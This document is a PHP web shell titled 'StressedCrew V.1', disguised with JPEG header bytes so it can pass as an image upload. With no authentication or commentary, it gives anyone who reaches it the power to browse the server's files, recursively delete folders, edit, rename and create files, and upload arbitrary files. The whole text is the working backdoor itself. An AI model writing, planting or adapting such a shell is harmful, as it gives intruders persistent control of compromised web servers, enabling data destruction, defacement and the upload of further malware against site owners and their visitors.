ÿØÿà
<?php
error_reporting(0);
set_time_limit(0);

ini_set('memory_limit','256M');

header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");

$path = realpath($_GET['path'] ?? getcwd());
if (!$path) $path = getcwd();
chdir($path);

function h($s){ return htmlspecialchars($s,ENT_QUOTES); }

if(isset($_GET['del'])){
    $x=$_GET['del'];
    if(is_dir($x)){
        function rr($d){
            foreach(scandir($d) as $i){
                if($i!='.'&&$i!='..'){
                    is_dir("$d/$i")?rr("$d/$i"):@unlink("$d/$i");
                }
            } @rmdir($d);
        } rr($x);
    } else @unlink($x);
    header("Location:?path=$path"); exit;
}

if(isset($_POST['rename'])){
    @rename($_POST['old'], $_POST['new']);
}

if(isset($_POST['save'])){
    file_put_contents($_POST['file'], $_POST['content']);
}

if(isset($_POST['newfile'])) file_put_contents($_POST['fname'],'');
if(isset($_POST['newfolder'])) mkdir($_POST['dname'],0755);

$msg='';
if(isset($_FILES['up'])){
    if(move_uploaded_file($_FILES['up']['tmp_name'], $_FILES['up']['name'])){
        $msg="upload success";
    } else {
        $msg="upload failed";
    }
}
?>
<!doctype html>
<html>
<head>
<title>StressedCrew V.1</title>

<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">

<style>
body{
    background:url('https://d.top4top.io/p_3766ro2xl0.jpg') no-repeat center center fixed;
    background-size:cover;
    font-family:'Share Tech Mono', monospace;
    color:#eaeaea;
    margin:0;
}

.container{
    padding:15px;
}

h1{
    text-align:center;
    font-size:20px;
    font-weight:normal;
    margin:15px 0;
    color:#fff;
    letter-spacing:2px;
}

.path-box{
    text-align:center;
    margin-bottom:15px;
    font-size:12px;
    color:#bbb;
    border-top:1px solid #222;
    border-bottom:1px solid #222;
    padding:5px;
    display:inline-block;
    width:100%;
}

.top-box{
    text-align:center;
    margin-bottom:20px;
}

.top-box form{
    margin:6px 0;
}

a{
    color:#9cf;
    text-decoration:none;
}
a:hover{
    color:#fff;
}

input,textarea,button{
    background:rgba(0,0,0,0.4);
    border:1px solid #333;
    color:#eee;
    font-family:inherit;
    padding:5px;
}

textarea{
    width:100%;
}

table{
    width:100%;
    border-collapse:collapse;
}

td,th{
    border-bottom:1px solid #222;
    padding:6px;
}

th{
    text-align:left;
    color:#aaa;
}

.editor{
    margin-bottom:15px;
}

hr{
    border:0;
    border-top:1px solid #222;
    margin:10px 0;
}
</style>
</head>

<body>
<div class="container">

<h1>StressedCrew V.1</h1>

<div class="path-box">
PATH : <?=h($path)?>
</div>

<div style="text-align:center; font-size:12px;"><?=h($msg)?></div>

<?php if(isset($_GET['edit'])): ?>
<div class="editor">
<form method="post">
<input type="hidden" name="file" value="<?=h($_GET['edit'])?>">
<textarea name="content" rows="20"><?=h(file_get_contents($_GET['edit']))?></textarea><br>
<div style="text-align:center;">
<button name="save">save</button>
</div>
</form>
</div>
<?php endif; ?>

<hr>

<div class="top-box">
<form method="post" enctype="multipart/form-data">
<input type="file" name="up">
<button>upload</button>
</form>

<form method="post">
<input name="fname" placeholder="file.txt">
<button name="newfile">new file</button>
</form>

<form method="post">
<input name="dname" placeholder="folder">
<button name="newfolder">new folder</button>
</form>
</div>

<hr>

<table>
<tr><th>name</th><th>size</th><th>action</th></tr>

<?php
if($path!='/'){
 echo "<tr><td><a href='?path=".dirname($path)."'>..</a></td><td></td><td></td></tr>";
}
foreach(scandir($path) as $f){
 if($f=='.'||$f=='..')continue;

 echo "<tr>
 <td>".(is_dir($f)?"[dir] <a href='?path=$path/$f'>$f</a>":"$f")."</td>
 <td>".(is_file($f)?filesize($f):'-')."</td>
 <td>
 <a href='?path=$path&del=$f'>del</a> |
 <a href='?path=$path&rename=$f'>ren</a>".
 (is_file($f)?" | <a href='?path=$path&edit=$f'>edit</a>":"").
 "</td></tr>";
}
?>
</table>

<?php if(isset($_GET['rename'])): ?>
<hr>
<form method="post" style="text-align:center;">
<input type="hidden" name="old" value="<?=h($_GET['rename'])?>">
<input name="new" placeholder="new name">
<button name="rename">rename</button>
</form>
<?php endif; ?>

</div>
</body>
</html>
